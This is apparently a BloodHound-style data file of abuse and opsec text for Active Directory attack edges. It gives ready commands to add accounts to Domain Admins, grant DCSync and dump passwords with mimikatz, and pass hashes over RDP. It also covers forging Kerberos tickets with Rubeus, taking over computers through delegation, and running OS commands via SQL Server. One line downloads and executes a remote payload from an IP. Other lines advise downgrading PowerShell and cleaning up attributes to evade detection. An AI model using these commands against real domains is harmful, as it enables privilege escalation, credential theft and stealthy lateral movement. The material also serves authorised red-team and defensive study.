#################################################################################       
GenericAll{
$Info='This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.'
$Abuse="Full control of a group allows you to directly modify group membership of the group. 

There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group 'Domain Admins' harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as SYBLE_LEININGER@DOMAIN.LOCAL if you are not running a process as that user. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):

`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
`$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', `$SecPassword)

Then, use Add-DomainGroupMember, optionally specifying `$Cred if you are not already running a process as SYBLE_LEININGER@DOMAIN.LOCAL:

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential `$Cred

Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:

Get-DomainGroupMember -Identity 'Domain Admins'"
$Opsec='This depends on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki.'
$Ref=@(
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://www.youtube.com/watch?v=z8thoG7gPd0"
"https://adsecurity.org/?p=1729"
"http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/"
"https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e"
"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"
"https://github.com/GhostPack/Rubeus#s4u"
"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"
"http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/"
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"
)
}
#################################################################################       
GenericWrite{
$Info='Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user'
$Abuse="GenericWrite to a group allows you to directly modify group membership of the group.

There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group 'Domain Admins' harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as a member of DOMAIN ADMINS@DOMAIN.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):

`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
`$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', `$SecPassword)

Then, use Add-DomainGroupMember, optionally specifying `$Cred if you are not already running a process as DOMAIN ADMINS@DOMAIN.LOCAL:

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential `$Cred

Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:

Get-DomainGroupMember -Identity 'Domain Admins'"
$Opsec='This depends on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki.'
$Ref=@(
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://www.youtube.com/watch?v=z8thoG7gPd0"
"http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/"
"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"
"https://github.com/GhostPack/Rubeus#s4u"
"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"
"http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/"
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"
)
}
#################################################################################
WriteOwner{
#
$Info="Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL."
#
$Abuse="To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.

You may need to authenticate to the Domain Controller as a member of DOMAIN ADMINS@DOMAIN.LOCAL if you are not running a process as a member. To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):

`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
`$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', `$SecPassword)

Then, use Set-DomainObjectOwner, optionally specifying `$Cred if you are not already running a process as Target group:

Set-DomainObjectOwner -Credential `$Cred -TargetIdentity testlab.local -OwnerIdentity harmj0y

To abuse ownership of a domain object, you may grant yourself the DcSync privileges.

You may need to authenticate to the Domain Controller as a member of the Target Group if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
`$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', `$SecPassword)

Then, use Add-DomainObjectAcl, optionally specifying `$Cred if you are not already running a process as the target Group:

Add-DomainObjectAcl -Credential `$Cred -TargetIdentity testlab.local -Rights DCSync

Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain

sekurlsa::dcsync /domain:testlab.local /user:Administrator

Cleanup can be done using the Remove-DomainObjectAcl function:
Remove-DomainObjectAcl -Credential `$Cred -TargetIdentity testlab.local -Rights DCSync

Cleanup for the owner can be done by using Set-DomainObjectOwner once again"
#
$Opsec='This depends on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki.'
#
$Ref=@(
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm"
"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"
"https://github.com/GhostPack/Rubeus#s4u"
"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"
"http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/"
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"
)
}
#################################################################################       
WriteDacl{
#
$Info="With write access to the target object's DACL, you can grant yourself any privilege you want on the object."
#
$Abuse="To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.

You may need to authenticate to the Domain Controller as a member of DOMAIN ADMINS@DOMAIN.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
`$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', `$SecPassword)

Then, use Add-DomainObjectAcl, optionally specifying `$Cred if you are not already running a process as DOMAIN ADMINS@DOMAIN.LOCAL:

Add-DomainObjectAcl -Credential `$Cred -TargetIdentity testlab.local -Rights DCSync

Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain

sekurlsa::dcsync /domain:testlab.local /user:Administrator

Cleanup can be done using the Remove-DomainObjectAcl function:
Remove-DomainObjectAcl -Credential `$Cred -TargetIdentity testlab.local -Rights DCSync"
#
$Opsec="When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support.
Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request.
Additional opsec considerations depend on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."
#
$Ref=@(
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://www.youtube.com/watch?v=z8thoG7gPd0"
"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"
"https://github.com/GhostPack/Rubeus#s4u"
"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"
"http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/"
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"
)
}       
#################################################################################
AllExtendedRights{
#
$Info='Extended rights are special rights granted on objects which allow reading of privileged attributes, as well as performing special actions.'
$Abuse="The AllExtendedRights privilege grants DOMAIN ADMINS@DOMAIN.LOCAL both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain DOMAIN.LOCAL. This can be abused using the lsadump::dcsync command in mimikatz."
$Opsec="When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."
$Ref=@(
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://www.youtube.com/watch?v=z8thoG7gPd0"
)
}
#################################################################################       
GpLink{
$Info='A linked GPO applies its settings to objects in the linked container.'
$Abuse='There is no abuse info related to this edge.'
$Opsec='There are no opsec considerations related to this edge.'
$Ref=@(
"https://wald0.com/?p=179"
"https://blog.cptjesus.com/posts/bloodhound15"
)
}
#################################################################################
Owns{
$Info="Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL"
$Abuse="To abuse ownership of a domain object, you may grant yourself the DcSync privileges.

You may need to authenticate to the Domain Controller as a member of DOMAIN ADMINS@DOMAIN.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
`$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', `$SecPassword)

Then, use Add-DomainObjectAcl, optionally specifying `$Cred if you are not already running a process as DOMAIN ADMINS@DOMAIN.LOCAL:

Add-DomainObjectAcl -Credential `$Cred -TargetIdentity TestGPO -Rights All

With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse

Cleanup can be done using the Remove-DomainObjectAcl function:
Remove-DomainObjectAcl -Credential `$Cred -TargetIdentity TestGPO -Rights All"
$Opsec="When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support.
Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request.
Additional opsec considerations depend on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."
$Ref=@(
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://www.youtube.com/watch?v=z8thoG7gPd0"
"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm"
"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"
"https://github.com/GhostPack/Rubeus#s4u"
"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"
"http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/"
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"
)
}       
#################################################################################
Contains{
$Info='GPOs linked to a container apply to all objects that are contained by the container.'
$Abuse="There is no abuse info related to this edge."
$Opsec='There are no opsec considerations related to this edge.'
$Ref=@(
"https://wald0.com/?p=179"
"https://blog.cptjesus.com/posts/bloodhound15"
)
}
#################################################################################
ReadLAPSPassword{
$Info='The local administrator password for a computer managed by LAPS is stored in the confidential LDAP attribute, “ms-mcs-AdmPwd”.'
$Abuse="To abuse this privilege with PowerView's Get-DomainObject, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as AZALEE_CASALE@DOMAIN.LOCAL if you are not running a process as that user. To do this in conjunction with Get-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
`$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', `$SecPassword)

Then, use Get-DomainObject, optionally specifying `$Cred if you are not already running a process as AZALEE_CASALE@DOMAIN.LOCAL:

Get-DomainObject windows1 -Credential `$Cred -Properties 'ms-mcs-AdmPwd',name"
$Opsec="Reading properties from LDAP is an extremely low risk operation."
$Ref=@(
"https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf"
"https://adsecurity.org/?p=3164"
)
}
#################################################################################
CanRDP{
$Info='Remote Desktop access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.
Note: This edge does not guarantee privileged execution.'
$Abuse="Abuse of this privilege will depend heavily on the type of access you have. 

# PlainText Credentials with Interactive Access
With plaintext credentials, the easiest way to exploit this privilege is using the built in Windows Remote Desktop Client (mstsc.exe). Open mstsc.exe and input the computer DC_1.DOMAIN.LOCAL. When prompted for credentials, input the credentials for EDELMIRA_LACY@DOMAIN.LOCAL to initiate the remote desktop connection.

# Password Hash with Interactive Access
With a password hash, exploitation of this privilege will require local administrator privileges on a system, and the remote server must allow Restricted Admin Mode. 
First, inject the NTLM credential for the user you're abusing into memory using mimikatz:

sekurlsa::pth /user:dfm /domain:testlab.local /ntlm:<ntlm hash> /run:'mstsc.exe /restrictedadmin'

This will open a new RDP window. Input the computer DC_1.DOMAIN.LOCAL to initiate the remote desktop connection. If the target server does not support Restricted Admin Mode, the session will fail.

#Plaintext Credentials without Interactive Access
This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:

(proxychains) xfreerdp /u:dfm /d:testlab.local /v:<computer ip>

xfreerdp will prompt you for a password, and then initiate the remote desktop connection.

# Password Hash without Interactive Access
This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. Additionally, the target computer must allow Restricted Admin Mode. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:

(proxychains) xfreerdp /pth:<ntlm hash> /u:dfm /d:testlab.local /v:<computer ip>

This will initiate the remote desktop connection, and will fail if Restricted Admin Mode is not enabled."
$Opsec="If the target computer is a workstation and a user is currently logged on, one of two things will happen. If the user you are abusing is the same user as the one logged on, you will effectively take over their session and kick the logged on user off, resulting in a message to the user. If the users are different, you will be prompted to kick the currently logged on user off the system and log on. If the target computer is a server, you will be able to initiate the connection without issue provided the user you are abusing is not currently logged in.
Remote desktop will create Logon and Logoff events with the access type RemoteInteractive."
$Ref=@(
"https://michael-eder.net/post/2018/native_rdp_pass_the_hash/"
"https://www.kali.org/penetration-testing/passing-hash-remote-desktop/"
)
}
#################################################################################
CanPSRemote{
$Info='PS Session access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.
Note: This edge does not guarantee privileged execution.'
$Abuse="Abuse of this privilege will require you to have interactive access with a system on the network.

A remote session can be opened using the New-PSSession powershell command.

You may need to authenticate to the Domain Controller as alice if you are not running a process as that user. To do this in conjunction with New-PSSession, first create a PSCredential object (these examples comes from the PowerView help documentation):

`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
`$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', `$SecPassword)

Then use the New-PSSession command with the credential we just created:

`$session = New-PSSession -ComputerName bob -Credential `$Cred

This will open a powershell session on bob.

You can then run a command on the system using the Invoke-Command cmdlet and the session you just created

Invoke-Command -Session `$session -ScriptBlock {Start-Process cmd}

Cleanup of the session is done with the Disconnect-PSSession and Remove-PSSession commands.

Disconnect-PSSession -Session `$session
Remove-PSSession -Session `$session

An example of running through this cobalt strike for lateral movement is as follows:

powershell `$session = New-PSSession -ComputerName win-2016-001; Invoke-Command -Session `$session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session `$session; Remove-PSSession -Session `$session"
$Opsec="When using the PowerShell functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI.
Entering a PSSession will generate a logon event on the target computer."
$Ref=@(
"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7/"
"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7"
)
}
#################################################################################
ExecuteDCOM{
$Info='Membership in the Distributed COM Users local group can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods.'
$Abuse='The PowerShell script Invoke-DCOM implements lateral movement using a variety of different COM objects (ProgIds: MMC20.Application, ShellWindows, ShellBrowserWindow, ShellBrowserWindow, and ExcelDDE). LethalHTA implements lateral movement using the HTA COM object (ProgId: htafile). 

One can manually instantiate and manipulate COM objects on a remote machine using the following PowerShell code. If specifying a COM object by its CLSID:

$ComputerName = CHERRY_FAGUNDES@DOMAIN.LOCAL # Remote computer
$clsid = “{fbae34e8-bf95-4da8-bf98-6c6e580aa348}” # GUID of the COM object
$Type = [Type]::GetTypeFromCLSID($clsid, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)

If specifying a COM object by its ProgID:

$ComputerName = CHERRY_FAGUNDES@DOMAIN.LOCAL # Remote computer
$ProgId = “” # GUID of the COM object
$Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)'
$Opsec='The artifacts generated when using DCOM vary depending on the specific COM object used.

DCOM is built on top of the TCP/IP RPC protocol (TCP ports 135 + high ephemeral ports) and may leverage several different RPC interface UUIDs(outlined here). In order to use DCOM, one must be authenticated. Consequently, logon events and authentication-specific logs(Kerberos, NTLM, etc.) will be generated when using DCOM. 

Processes may be spawned as the user authenticating to the remote system, as a user already logged into the system, or may take advantage of an already spawned process. 

Many DCOM servers spawn under the process “svchost.exe -k DcomLaunch” and typically have a command line containing the string “ -Embedding” or are executing inside of the DLL hosting process “DllHost.exe /Processid:{}“ (where AppId is the AppId the COM object is registered to use). Certain COM services are implemented as service executables; consequently, service-related event logs may be generated.'
$Ref=@(
"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ "
"https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/"
"https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/"
"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/"
"https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom"
"https://www.cybereason.com/blog/dcom-lateral-movement-techniques"
"https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/"
"https://attack.mitre.org/wiki/Technique/T1175"
"https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1"
"https://codewhitesec.blogspot.com/2018/07/lethalhta.html"
"https://github.com/codewhitesec/LethalHTA/"
)
}
#################################################################################
AllowedToDelegate{
$Info ='The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. That is, a node with this privilege can impersonate any domain principal (including Domain Admins) to the specific service on the target host. One caveat- impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked.
An issue exists in the constrained delegation where the service name (sname) of the resulting ticket is not a part of the protected ticket information, meaning that an attacker can modify the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo is “HTTP/host.domain.com”, tickets can be modified for LDAP/HOST/etc. service names, resulting in complete server compromise, regardless of the specific service listed.'
$Abuse="Abusing this privilege can utilize Benjamin Delpy’s Kekeo project, proxying in traffic generated from the Impacket library, or using the Rubeus project's s4u abuse.

In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the 'HTTP/PRIMARY.testlab.local' service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the 'admin' user to the 'HTTP/PRIMARY.testlab.local' SPN. The alternative sname 'cifs' is substituted in to the final service ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the 'admin' user.

Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:'HTTP/PRIMARY.testlab.local' /altservice:cifs /ptt"
$Opsec='As mentioned in the abuse info, in order to currently abuse this primitive the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. See the References for more information.'
$Ref=@(
"https://github.com/GhostPack/Rubeus#s4u"
"https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/"
"http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/"
"https://twitter.com/gentilkiwi/status/806643377278173185"
"https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more"
"http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/"
"http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/"
)
}

###########
AllowedTOAct{
$info='An attacker can use this account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.
One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service pricipal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.'
$Abuse='Abusing this primitive is currently only possible through the Rubeus project.
To use this attack, the controlled account MUST have a service principal name set, along with access to either the plaintext or the RC4_HMAC hash of the account.
If the plaintext password is available, you can hash it to the RC4_HMAC version using Rubeus:

Rubeus.exe hash /password:Summer2018! 

Use Rubeus *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:

Rubeus.exe s4u /user:AZALEE_CASALE@DOMAIN.LOCAL$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
$Opsec='To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain.'
$Ref=@(
"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"
"https://github.com/GhostPack/Rubeus#s4u"
"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"
"http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/"
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"
)
#########
}
AddAllowedTOAct{
$info='The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object.
If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.
One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service pricipal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.'
$Abuse="Abusing this primitive is currently only possible through the Rubeus project.
First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:

New-MachineAccount -MachineAccount attackersystem -Password `$(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:

`$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:

`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList 'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;`$(`$ComputerSid))'
`$SDBytes = New-Object byte[] (`$SD.BinaryLength)
`$SD.GetBinaryForm(`$SDBytes, 0)

Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:

`$RawBytes = Get-DomainComputer 'TARGETCOMPUTER' -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity

We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:

Rubeus.exe hash /password:Summer2018!

And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to 'pretend' to be 'admin' for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:

Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"
$Opsec='To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. Modification of the *msDS-AllowedToActOnBehalfOfOtherIdentity* property against the target also must occur, whether through PowerShell or another method. The property should be cleared (or reset to its original value) after attack execution in order to prevent easy detection.'
$Ref=@(
"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"
"https://github.com/GhostPack/Rubeus#s4u"
"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"
"http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/"
"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"
)
}
#################################################################################
SQLAdmin{
$Info='The user x is a SQL admin on the computer y.

There is at least one MSSQL instance running on y where the user x is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques.

For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of "MSSQLSvc" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.'
$Abuse="Scott Sutherland (@nullbind) from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for Attacking SQL Server. Major contributors include Antti Rantasaari, Eric Gruber (@egru), and Thomas Elling (@thomaselling). Before executing any of the below commands, download PowerUpSQL and laod it into your PowerShell instance. Get PowerUpSQL here: https://github.com/NetSPI/PowerUpSQL.

Finding Data

Get a list of databases, sizes, and encryption status:

Get-SQLDatabaseThreaded –Verbose -Instance sqlserverinstance –Threads 10 -NoDefaults

Search columns and data for keywords:

Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserverinstance –Threads 10 –Keyword `“card, password`” –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize

Executing Commands

Below are examples of PowerUpSQL functions that can be used to execute operating system commands on remote systems through SQL Server using different techniques. The level of access on the operating system will depend largely what privileges are provided to the service account. However, when domain accounts are configured to run SQL Server services, it is very common to see them configured with local administrator privileges.

xp_cmdshell Execute Example:

Invoke-SQLOSCmd -Verbose -Command `"Whoami`" -Threads 10 -Instance sqlserverinstance

Agent Job Execution Examples:

Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command `"echo hello > c:windows	emp	est1.txt`" -Instance sqlserverinstance -username myuser -password mypassword

Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output `"hello world`" | out-file c:windows	emp	est2.txt' -Sleep 20 -Instance sqlserverinstance -username myuser -password mypassword

Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:windowssystem32cmd.exe /c echo hello > c:windows	emp	est3.txt' -Instance sqlserverinstance -username myuser -password mypassword

Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:windowssystem32cmd.exe /c echo hello > c:windows	emp	est3.txt' -Instance sqlserverinstance -username myuser -password mypassword

Python Subsystem Execution:

Invoke-SQLOSPython -Verbose -Command `"Whoami`" -Instance sqlserverinstance

R subsystem Execution Example

